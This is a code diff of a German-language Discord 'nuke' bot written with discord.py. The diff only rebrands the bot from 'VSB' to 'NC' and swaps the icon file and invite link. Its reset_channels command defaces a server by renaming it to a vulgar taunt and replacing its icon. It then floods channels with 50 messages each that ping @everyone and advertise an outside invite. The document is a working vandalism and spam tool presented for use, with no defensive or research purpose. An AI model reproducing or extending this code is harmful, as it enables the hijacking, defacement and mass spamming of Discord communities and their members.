@@ -16,8 +16,8 @@ bot = commands.Bot(command_prefix="!", intents=intents)
 async def reset_channels(ctx):
     guild = ctx.guild
     try:
-        await guild.edit(name="FUCKED BY VSB IHR BITCHES!")
-        with open("vsb_icon.jpg", "rb") as icon_file:
+        await guild.edit(name="FUCKED BY NC IHR BITCHES!")
+        with open("icon_nuke.jpeg", "rb") as icon_file:
             await guild.edit(icon=icon_file.read())
         print("✅ Servername und Icon geändert.")
     except Exception as e:
@@ -33,7 +33,7 @@ async def reset_channels(ctx):
     async def spam(channel):
         for _ in range(50):
             try:
-                await channel.send("Fucked by VSB! Womp Womp! Error 67! @everyone https://discord.gg/pXfn9cvb")
+                await channel.send("Fucked by NC! Womp Womp! Error 67! @everyone https://discord.gg/elnarco")
             except Exception as e:
                 print(f"Fehler in {channel.name}: {e}")
 
